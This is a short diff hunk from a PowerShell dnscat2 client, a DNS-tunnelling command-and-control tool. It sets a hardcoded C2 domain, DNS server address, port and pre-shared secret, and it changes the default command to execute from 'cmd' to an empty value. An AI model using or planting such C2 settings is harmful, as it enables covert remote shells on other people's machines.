@@ -2013,7 +2013,7 @@ function Update-Dnscat2Session ($Session) {
         [string]$Domain="cybermamba.es"
         [string]$DNSServer="192.168.42.152"
         [int32]$DNSPort=53
-        [string]$Exec="cmd"
+        [string]$Exec=""
         [switch]$Console=$False
         [switch]$ExecPS=$False
         [string]$PreSharedSecret="ASDFQER4Tsdfhg354"
